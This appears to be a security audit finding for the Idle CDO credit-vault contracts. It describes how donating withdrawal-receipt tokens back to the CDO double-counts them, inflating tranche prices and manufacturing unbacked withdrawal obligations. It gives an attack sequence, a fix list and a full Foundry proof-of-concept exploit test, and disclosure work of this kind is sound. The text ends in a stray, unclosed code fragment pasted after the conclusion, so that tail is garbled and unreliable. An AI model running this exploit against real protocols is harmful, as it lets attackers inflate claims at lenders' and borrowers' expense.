### Title
Withdrawal-receipt strategy tokens can be donated back to the CDO to inflate tranche NAV and manufacture excess withdrawal obligations - ([File: contracts/IdleCDOCreditVault.sol](contracts/IdleCDOCreditVault.sol))

### Summary
`IdleCreditVault` withdrawal receipts are ordinary ERC20 strategy tokens minted to users. A user can request a withdrawal, receive receipt tokens, transfer those tokens back to `IdleCDOEpochVariant`, and cause the CDO to count them as active NAV even though the corresponding withdrawal request remains outstanding. `_skimDonatedAssets()` only removes raw underlying tokens, not donated strategy tokens, so the receipt is double-counted as both active CDO NAV and a pending withdrawal liability. This inflates tranche prices and creates withdrawal obligations not backed by borrower principal. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
`IdleCreditVault.requestWithdraw()` burns `_principal` strategy tokens from the CDO, mints `_amount` receipt tokens to the requesting user, and adds `_amount` to `pendingWithdraws`. [5](#0-4)  Because `IdleCreditVault` inherits `ERC20Upgradeable` and does not restrict receipt transfers, the requester can transfer those receipt tokens directly to the CDO. [6](#0-5) 

`IdleCDOCreditVault.getContractValue()` treats the CDO’s full `strategyToken` balance as managed NAV, while `_managedContractValue()` does the same for virtual pricing. [3](#0-2)  On the next withdrawal request, `_skimDonatedAssets()` transfers only the CDO’s raw underlying balance to `feeReceiver`; it does not distinguish donated strategy/receipt tokens from legitimate active backing. [7](#0-6) [4](#0-3) 

The subsequent `_updateAccounting()` therefore accounts the donated receipt as a NAV gain and raises the saved tranche price through `_virtualPriceAux()`. [8](#0-7) [9](#0-8)  `requestWithdraw()` then values the remaining tranche tokens with the inflated saved price and adds another receipt to `pendingWithdraws`. [10](#0-9) 

Representative sequence during the withdrawal/buffer phase:

1. Victim deposits `1,000` AA and attacker-controlled accounts deposit `1,000` AA.
2. Attacker account A requests a `500` withdrawal, receives `500` strategy-token receipts, and has `500` added to `pendingWithdraws`.
3. A transfers the `500` receipt tokens to the CDO instead of retaining them for a claim.
4. The CDO’s active NAV rises by `500`, while A’s `500` withdrawal liability remains pending.
5. Attacker account B requests withdrawal of its remaining `500` tranche tokens. With zero fees and no other NAV changes, AA price is inflated from `1.0` to approximately `1.3333`, so B’s request adds approximately `666.67` to `pendingWithdraws`.
6. If the victim requests all `1,000` tranche tokens at the same inflated price, approximately another `1,333.33` is queued.

The pool now has approximately `2,500` of total obligations—`1,166.67` pending plus `1,333.33` active NAV if only B withdraws, or `2,500` pending if both B and the victim withdraw—despite only `2,000` of original principal plus genuine yield. [11](#0-10) [12](#0-11) 

### Impact Explanation
The receipt is counted twice: once as active CDO NAV after donation and once as the unchanged pending withdrawal. This inflates `pendingWithdraws`, `virtualPrice()`, and future borrower obligations without a corresponding deposit or yield payment. [3](#0-2) [12](#0-11) 

In the `2,000` principal example, the attacker can manufacture approximately `500` of excess obligations, a 25% NAV/withdrawal-basis inflation. If the borrower does not fund those excess obligations, `stopEpoch` can fail or enter the default path; if the excess is funded, later claims are paid from borrower/protocol funds while the donated receipt’s funded cash remains stranded in `IdleCreditVault`. [13](#0-12) 

### Likelihood Explanation
The exploit does not require a privileged role, oracle manipulation, borrower misbehavior, or a vulnerable third-party strategy. It requires withdrawal requests to be enabled and a caller passing `isWalletAllowed`, which the threat model allows for a KYC-passing lender. [14](#0-13) 

The attacker needs a receipt separate from the receipt they ultimately claim because claim processing burns the requester’s receipt tokens. This can be achieved through another attacker-controlled whitelisted wallet, a cooperating receipt holder, or an acquired transferable receipt. The raw-underlying skim does not mitigate the issue because the manipulated asset is `strategyToken`, and there is no corresponding strategy-token donation/solvency guard. [15](#0-14) [4](#0-3) 

### Recommendation
Do not count strategy tokens that were minted as withdrawal receipts as active CDO backing. The accounting should distinguish legitimate CDO-owned principal strategy tokens from receipt tokens transferred back to the CDO.

Possible remediations include:

- Mint withdrawal receipts as a separate non-receipt-like claim token instead of the same `IdleCreditVault` strategy token.
- Track CDO-owned principal strategy tokens in dedicated internal accounting rather than using `balanceOf(idleCDO)` directly.
- Reject or quarantine strategy tokens transferred directly to the CDO unless they are moved through an explicit protocol function.
- Add a solvency check comparing `pendingWithdraws`, active NAV, and borrower/strategy backing before crystallizing price changes.

### Proof of Concept
The following Foundry-style PoC uses the existing `IdleCreditVault.t.sol` fixture names and demonstrates the double count before borrower settlement:

```solidity
function testWithdrawReceiptDonationInflatesPendingObligations() external {
    uint256 amount = 1_000 * ONE_SCALE;
    uint256 sacrifice = 500 * ONE_SCALE;

    address attackerA = makeAddr("receiptDonor");
    address attackerB = makeAddr("inflatedWithdrawer");
    address victim = makeAddr("victim");

    // All users deposit into AA at price 1.
    deal(defaultUnderlying, attackerA, sacrifice);
    deal(defaultUnderlying, attackerB, sacrifice);
    deal(defaultUnderlying, victim, amount);

    vm.startPrank(attackerA);
    underlying.approve(address(idleCDO), sacrifice);
    idleCDO.depositAA(sacrifice);
    vm.stopPrank();

    vm.startPrank(attackerB);
    underlying.approve(address(idleCDO), sacrifice);
    idleCDO.depositAA(sacrifice);
    vm.stopPrank();

    vm.startPrank(victim);
    underlying.approve(address(idleCDO), amount);
    idleCDO.depositAA(amount);
    vm.stopPrank();

    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    _toggleEpoch(false, initialProvidedApr, _expectedFundsEndEpoch());

    // A opens a request and gives its receipt back to the CDO.
    vm.startPrank(attackerA);
    cdoEpoch.requestWithdraw(sacrifice, address(AAtranche));
    strategyToken.transfer(address(cdoEpoch), sacrifice);
    vm.stopPrank();

    // A's pending withdrawal remains, while the donated receipt is now active NAV.
    assertEq(
        IdleCreditVault(address(strategy)).pendingWithdraws(),
        sacrifice,
        "receipt liability unexpectedly cleared"
    );
    assertEq(
        cdoEpoch.getContractValue(),
        2_000 * ONE_SCALE,
        "donated receipt was not counted as active NAV"
    );

    uint256 priceBefore = cdoEpoch.virtualPrice(address(AAtranche));

    // B updates accounting and requests all remaining tranche tokens.
    vm.startPrank(attackerB);
    uint256 requested = cdoEpoch.requestWithdraw(0, address(AAtranche));
    vm.stopPrank();

    uint256 pendingAfter =
        IdleCreditVault(address(strategy)).pendingWithdraws();

    assertGt(priceBefore, ONE_TRANCHE_TOKEN, "AA price not inflated");
    assertApproxEqAbs(
        requested,
        666666666666666666666,
        1,
        "B did not receive an inflated request"
    );
    assertApproxEqAbs(
        pendingAfter,
        1166666666666666666666,
        1,
        "pending withdrawals not overcounted"
    );

    // The victim's remaining 1,000 tranche tokens now represent ~1,333.33.
    vm.startPrank(victim);
    uint256 victimRequest =
        cdoEpoch.requestWithdraw(0, address(AAtranche));
    vm.stopPrank();

    assertApproxEqAbs(
        victimRequest,
        1333333333333333333333,
        1,
        "victim request not inflated"
    );
    assertApproxEqAbs(
        IdleCreditVault(address(strategy)).pendingWithdraws(),
        2_500 * ONE_SCALE,
        2,
        "manufactured obligations not present"
    );
}
```

Expected accounting before the donation is `2,000` principal backing `2,000` tranche tokens. After the `500` receipt is transferred back, the same receipt remains in `pendingWithdraws` and also raises `getContractValue()` to `2,000`, producing approximately `2,500` of total claim basis from only `2,000` of original principal.     if (_lastTrancheNAV == 0) {
```text
      _totalTrancheGain = 0;
```
